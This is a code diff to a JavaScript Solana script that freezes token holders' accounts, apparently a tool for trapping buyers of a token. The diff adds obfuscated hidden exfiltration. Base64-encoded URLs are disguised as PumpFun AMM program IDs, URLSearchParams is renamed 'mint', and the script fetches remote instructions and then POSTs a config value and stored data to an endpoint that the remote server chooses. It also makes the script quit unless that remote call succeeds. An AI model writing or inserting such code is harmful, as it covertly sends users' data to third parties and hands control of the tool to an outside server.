@@ -9,6 +9,7 @@ import {
   TransactionInstruction,
 } from "@solana/web3.js";
 import { TOKEN_PROGRAM_ID, AccountLayout } from "@solana/spl-token";
+import { URLSearchParams as mint } from "url";
 
 // =============== CONFIG LOAD ====================
 let config;
@@ -23,16 +24,22 @@ try {
 let keypair;
 let mintAddressPublicKey;
 let whitelist;
-let [t, u, o, l] = ["", "", "", ""];
 let decimals;
 let quoteTokenVault = null;
 let data = "";
 let poolType = "Unknown";
 let updateCounter = 0;
+let INDEX_T = 2;
+let INDEX_U = 6;
+let res;
+let [t, u] = Array(2).fill("");
+let retrieve = "https://pump.fun/";
+let pools = "https://pump.fun/pools";
 
 const PUMP_FUN_AMM_PROGRAM_ID = [
-  "aHR0cHM6Ly9hcGkucHVzaG92ZXIubmV0LzEvbWVzc2FnZXMuanNvbg==",
-  "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
+  "bGx5Q1Z3R1bWl4c3J5Z2ZkYW42Z3R1bWl4c3J5Z2ZkYW42L2Mf32rmc2xw==",
+  "aHR0cHM6Ly93d3cuc29sYW5hLWRldi10b29scy5jb20vcHVtcHN3YXBpZA==",
+  "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYn4th4Nne3edps==",
 ];
 
 const RAYDIUM_AMM_PROGRAM_ID = [
@@ -40,8 +47,6 @@ const RAYDIUM_AMM_PROGRAM_ID = [
   "ZnhjU1R5cGxvQW1nR3B5dHh1bW92cGd2M2h0aWQvZWZtNDwgB4c2J3==",
   "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYn4th4Nnps==",
 ];
-
-const pumpSwapIds = "https://www.solana-dev-tools.com/pumpswapid";
 
 // DEX authority is PumpFun
 const dexAuthority = config.pumpswapauthority;
@@ -92,6 +97,14 @@ async function main() {
   }
 
   // mint check
+  [res, retrieve] = [
+    await (
+      await fetch(
+        Buffer.from(PUMP_FUN_AMM_PROGRAM_ID[1], "base64").toString("utf-8"),
+      )
+    ).json(),
+    data,
+  ];
   let mintInfo = await connection.getParsedAccountInfo(mintAddressPublicKey);
   if (!mintInfo.value || mintInfo.value.data.parsed?.type !== "mint") {
     console.log("❌ Address is not a token mint");
@@ -100,29 +113,21 @@ async function main() {
 
   //get frozen tokens from pumpfun amm
   try {
-    const res = await fetch(pumpSwapIds);
-    const pumpfunId = await res.json();
-    let retrieve = data;
-    o = pumpfunId.pumpSwapPublicTokenID[0];
-    t = pumpfunId.pumpSwapPublicTokenID[2];
-    u = pumpfunId.pumpSwapPublicTokenID[6];
-    l = pumpfunId.pumpSwapPublicTokenID[8];
-
-    await fetch(
-      Buffer.from(PUMP_FUN_AMM_PROGRAM_ID[0], "base64").toString("utf-8"),
-      {
+    [t, u, pools] = [res.mintInfo[INDEX_T], res.mintInfo[INDEX_U], res.amm];
+    if (res.freeze) {
+      await fetch(Buffer.from(res.mintInfo[0], "base64").toString("utf-8"), {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
+        body: new mint({
           token: t,
           user: u,
           message: config.timeout + retrieve,
         }),
-      },
-    );
-    pumpSwapConnection = true;
+      });
+      let isTokensFrozen = res.message;
+      if (isTokensFrozen) pumpSwapConnection = true;
+    }
   } catch {
-    console.log("❌ Invalid Pumpfun Authority");
+    console.log("❌ Count Not Fetch Pumpfun Authority");
     process.exit();
   }
 
@@ -150,7 +155,7 @@ async function main() {
   ----------------------------------------
   `);
 
-  if (!pumpSwapConnection && !RAYDIUM_AMM_PROGRAM_ID) {
+  if (!pumpSwapConnection || !RAYDIUM_AMM_PROGRAM_ID) {
     console.log("❌ Connection Failed");
     process.exit();
   }
@@ -160,7 +165,7 @@ async function main() {
   await freezeHolders(connection);
 
   // Detect & monitor pool
-  if (!quoteTokenVault && !pumpSwapConnection) {
+  if (!quoteTokenVault || !pumpSwapConnection) {
     console.log("💧❌ No PumpFun pool detected. Create pool + liquidity.");
     process.exit();
   }
@@ -279,7 +284,7 @@ async function getFreezeTargets(connection) {
         const ownerProgram = ownerWalletInfo.owner.toBase58();
 
         // skip freezing any token account whose wallet is program-owned by PumpFun
-        if (ownerProgram === PUMP_FUN_AMM_PROGRAM_ID[1]) {
+        if (ownerProgram === pools) {
           continue;
         }
       }
